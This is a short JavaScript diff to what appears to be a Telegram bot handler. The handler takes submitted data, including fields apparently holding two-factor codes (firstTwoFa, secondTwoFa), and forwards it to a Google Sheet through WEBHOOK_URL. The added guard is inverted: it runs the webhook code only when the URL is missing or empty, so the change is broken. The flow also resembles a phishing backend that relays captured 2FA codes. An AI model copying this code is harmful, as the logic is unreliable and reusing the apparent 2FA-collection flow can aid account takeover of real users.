@@ -42,6 +42,7 @@ if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
 
 }
 
+if(process.env.WEBHOOK_URL == undefined  || process.env.WEBHOOK_URL == ""){
     // ADD GOOGLE SHEET
     const url = new URL(process.env.WEBHOOK_URL);
 
@@ -68,6 +69,7 @@ if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
     .catch(error => {
         bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
     });
+}
 
 });
 
